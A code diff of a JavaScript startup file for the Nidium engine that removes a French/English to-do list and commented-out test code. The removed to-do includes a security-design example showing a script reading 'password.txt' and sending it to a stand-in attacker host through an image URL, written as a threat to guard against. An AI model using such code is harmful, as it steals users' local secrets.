@@ -1,152 +1,4 @@
-/*
-	Today :
-		- hang si NML est invalid
-		- bug des gradients (crash)
-
-
-		- donner texture du dessous au shader;
-		- canvas.blur(0, 1 ... 4);
-
-
-	CANVAS :
-		- canvas.toArrayBuffer();
-		- window.canvas.snapshot(x, y, w, h);
-		- import des fontes
-
-
-	SECURITY DESIGN :
-		- restraindre API File dans le dossier definie par localFileAccess
-		- les appels à File.read("config.bin") --> dist/shared/config.bin
-
-		- Nidium Malicious Bacon Attack :
-			var m = File.read("password.txt", function(data, size){
-				var i = new Image();
-				t.src = "http://www.hackers.com/content="+URLencode(data);
-			});
-
-	FINITIONS
-		- Callback d'érreur si le fichier ne peux pas être ouvert (404 http, fichier local inexistant, etc..)
-
-
-	IMPACT SIGNIFICATIF :
-		- Gestion du cache
-
-	THREADS AND WORKER
-		- thread crash
-		- Synchronous File API in Thread
-		- API Worker + rajouter include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)
-
-	STEALTH INVISIBLE MODE :
-		- 512Mo Ramdisk
-		- Cleanup Destruction on quit
-
-	COMPLEXE : 
-		- scale
-
-	VERY LOW PRIORITY : 
-		- ctx.outlineBlur = 5;
-		- ctx.outlineColor = "blue";
-		- nss can not be empty and must have minimum {} in it
-		- subtlepatterns.com : contacter (DONE) et rajouter le crédit
-		- window.resize
-
-------
-DONE :
-------
-
-	DAY 6:
-		- NML basics + include
-		- fixer la console
-		- showFPS(true) crash au refresh
-
-	DAY 5:
-	- window.storage.set (sync)
-	- window.storage.get (sync)
-
-	DAY 4:
-	- shader ne suit pas le coin haut gauche du layer (DONE)
-	- faire que attachFragmentShader tiennent compte du padding (DONE)
-	- Work with Nico : crash au start sur linux (maybe font / skia)
-	- Bug Gradient UIOption (DONE)
-	- cabler window.devicePixelRatio (WIP)
-
-	DAY 3:
-	- Stream API: getFileSize (distant + locaux) (DONE)
-	- Stream API: seek (distant + locaux) (DONE)
-	- Stream API: Implémenter NativeStream::stop() (DONE)
-	- cabler canvas.attachFragmentShader(); (DONE)
-	- cabler canvas.detachFragmentShader(); (DONE)
-
-	DAY 2
-	- renommer Native.canvas en window.canvas (main canvas)
-	- Stream API Design + WIP
-
-	DAY 1
-	- corriger textAlign vertical (center) (DONE)
-	- renommer ctx.fontType en ctx.fontFamily (DONE)
-	- window.requestAnimationFrame; (DONE)
-	- measureText.width (DONE)
-	- nml : <viewport>1024x768</viewport> (DONE)
-	- nml est maintenant parsé avant le lancement (DONE)
-
-	OLD
-	- Image() et File() file relative to nml : (DONE)
-	- document.location.href = "fdsf/view.nml"; (DONE)
-	- contextmenu window.mouseX, window.mouseY (DONE)
-	- radial gradient : fail (DONE)
-	- button down rotation : fail (DONE)
-	- textAlign vertical (ALMOST DONE)
-
-*/
-
-
 document.background = "#333333";
-//load("sample.js");
-
-/*
-var c0 = new Canvas(200, 200),
-	ctx = c0.getContext("2d");
-
-c0.padding = 20;
-c0.left = 20;
-c0.top = 20;
-window.canvas.add(c0);
-
-ctx.shadowBlur = 14;
-ctx.shadowColor = "black";
-ctx.fillStyle = "red";
-ctx.fillRect(0, 0, 200, 200);
-*/
-
-
-/*
-var but = new UIButton(document, {
-	left : 20,
-	top : 160,
-	label : "Remove",
-	background : "#000000",
-	fontSize : 10.5
-});
-
-console.log(
-	but.width,
-	but.options.width,
-	but.inline.width,
-	but.layer.width
-);
-
-console.dump(but.inline);
-
-setTimeout(function(){
-console.log(
-	but.width,
-	but.options.width,
-	but.inline.width,
-	but.layer.width
-);
-}, 1500);
-
-*/
 
 
 //load("applications/_tests/timers.js");
@@ -155,7 +7,6 @@ console.log(
 //load("applications/_tests/sockets.client.js");
 //load("applications/_tests/sockets.server.js");
 //load("applications/_tests/tasks.js");
-
 //load("applications/components/hello.js");
 //load("applications/components/motion.js");
 //load("applications/components/tabs.js");
@@ -176,8 +27,8 @@ console.log(
 //load("applications/components/text.js"); // FAIL
 //load("applications/components/__zzz.js");
 
-/* CANVAS TESTS (SANS NATIVE FRAMEWORK)*/
 
+/* CANVAS TESTS (SANS NATIVE FRAMEWORK)*/
 //load("applications/canvas/water.js"); // fail
 //load("applications/canvas/bluewheel.js"); // FAIL (GlobalComposite)
 //load("applications/canvas/sand.js"); // OK
@@ -191,24 +42,24 @@ console.log(
 //load("applications/components/flickr.js");
 
 
-/* UNIT TESTS */
+/* TESTS */
 
-	//load("applications/_tests/arc.js");
-	//load("testArc.js");
-	//load("testRetina.js");
+    //load("applications/_tests/arc.js");
+    //load("testArc.js");
+    //load("testRetina.js");
 
 
 /* MEDIA API */
 
-	//load("applications/audio/test.js"); // OK
-	//load("applications/audio/mixer.js"); // OK
-	//load("applications/audio/dsp.js"); // OK
-	//load("applications/media/video.js"); // OK
+    //load("applications/audio/test.js"); // OK
+    //load("applications/audio/mixer.js"); // OK
+    //load("applications/audio/dsp.js"); // OK
+    //load("applications/media/video.js"); // OK
 
 /* FILE API */
 
-	//load("applications/components/file.basic.js");
-	//load("applications/components/file.advanced.js");
+    //load("applications/components/file.basic.js");
+    //load("applications/components/file.advanced.js");
 
 
 /* SHADERS */
@@ -272,23 +123,22 @@ o.background = "white";
 o.label = "Mama's gonna snatch"
 */
 
-
 /* TUTORIALS */
 
-	//load("applications/tutorials/01.hello.js");
-	//load("applications/tutorials/02.buttons.js");
-	//load("applications/tutorials/03.events.js");
-	//load("applications/tutorials/04.motion.js");
-	//load("applications/tutorials/11.post.js");
+    //load("applications/tutorials/01.hello.js");
+    //load("applications/tutorials/02.buttons.js");
+    //load("applications/tutorials/03.events.js");
+    //load("applications/tutorials/04.motion.js");
+    //load("applications/tutorials/11.post.js");
 
 /* Unfinished */
 
-	//load("applications/components/splines.js"); // LENTEUR ABOMINABLE
-	//load("applications/components/diagrams.js");
-
+    //load("applications/components/splines.js"); // LENTEUR ABOMINABLE
+    //load("applications/components/diagrams.js");
 
 
 /* -- Native Debugger ------------------ */
 
 //load("applications/NatBug.nap");
+
 
